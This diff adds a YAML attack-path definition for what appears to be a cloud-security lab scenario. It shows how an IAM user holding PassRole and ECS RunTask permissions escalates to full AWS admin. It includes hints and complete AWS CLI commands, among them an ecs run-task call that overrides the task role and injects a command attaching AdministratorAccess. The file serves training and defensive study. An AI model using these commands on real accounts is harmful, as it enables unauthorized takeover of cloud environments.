@@ -1,0 +1,82 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-ecs-008-to-admin-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has iam:PassRole and ecs:RunTask permissions, which can be combined
+        to run an ECS Fargate task with a privileged role override and a malicious command
+        override — without needing ecs:RegisterTaskDefinition.
+
+    - id: ecs-task
+      label: "ECS Fargate Task"
+      type: resource
+      subType: ecs-task
+      arn: "arn:aws:ecs:{region}:{account_id}:task/pl-prod-ecs-008-cluster/*"
+      description: >
+        An ephemeral ECS Fargate task launched using an existing task definition
+        (pl-prod-ecs-008-existing-task) with runtime overrides applied. The task runs
+        with the admin role as its task role and executes the injected command before
+        terminating. It leaves only CloudTrail logs as evidence and never requires
+        a new task definition to be registered.
+
+    - id: target-role
+      label: "Admin Task Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-ecs-008-to-admin-target-role"
+      description: >
+        An IAM role with AdministratorAccess that is trusted by ecs-tasks.amazonaws.com.
+        By passing this role to the ECS task via the taskRoleArn override, the attacker's
+        container workload executes with full administrative credentials. The task assumes
+        this role and uses it to attach AdministratorAccess to the starting user, granting
+        the attacker full administrative control over the AWS account.
+
+  edges:
+    - from: starting-principal
+      to: ecs-task
+      label: "ecs:RunTask + iam:PassRole"
+      description: >
+        The attacker calls ecs:RunTask against the existing task definition, using
+        --overrides to set taskRoleArn to the admin role (requiring iam:PassRole)
+        and to inject a command that attaches AdministratorAccess to the starting user.
+      hints:
+        - "You can run ECS tasks and pass roles. Think about what happens when you override both the command and the task role at runtime."
+        - "Look at existing task definitions in the account — you don't need to register a new one."
+        - "Use ecs:RunTask with --overrides to set taskRoleArn to an admin role and inject an AWS CLI command that attaches AdministratorAccess to your user."
+        - "Browse to https://pathfinding.cloud/paths/ecs-008 for technique details."
+      commands:
+        - description: "Discover existing ECS clusters"
+          command: "aws ecs list-clusters"
+        - description: "Discover existing task definitions"
+          command: "aws ecs list-task-definitions"
+        - description: "Find VPC and subnet for Fargate networking"
+          command: "aws ec2 describe-subnets --filters Name=default-for-az,Values=true --query 'Subnets[0].SubnetId' --output text"
+        - description: "Run the task with command and role overrides"
+          command: "aws ecs run-task --cluster pl-prod-ecs-008-cluster --task-definition pl-prod-ecs-008-existing-task --launch-type FARGATE --network-configuration 'awsvpcConfiguration={subnets=[<SUBNET_ID>],assignPublicIp=ENABLED}' --overrides '{\"taskRoleArn\":\"arn:aws:iam::<ACCOUNT_ID>:role/pl-prod-ecs-008-to-admin-target-role\",\"containerOverrides\":[{\"name\":\"main\",\"command\":[\"aws\",\"iam\",\"attach-user-policy\",\"--user-name\",\"pl-prod-ecs-008-to-admin-starting-user\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"]}]}'"
+
+    - from: ecs-task
+      to: target-role
+      label: "assumes role + iam:AttachUserPolicy"
+      description: >
+        The Fargate task assumes the admin role via the taskRoleArn override. The ECS
+        platform injects temporary credentials for this role into the task container
+        automatically. Running as the admin role, the task calls iam:AttachUserPolicy
+        to attach AdministratorAccess to the starting user. After the task completes,
+        the attacker uses their original credentials to verify and exercise full admin
+        access.
+      commands:
+        - description: "Verify privilege escalation succeeded"
+          command: "aws iam list-attached-user-policies --user-name pl-prod-ecs-008-to-admin-starting-user"
+        - description: "Confirm admin access with a privileged operation"
+          command: "aws iam list-users"
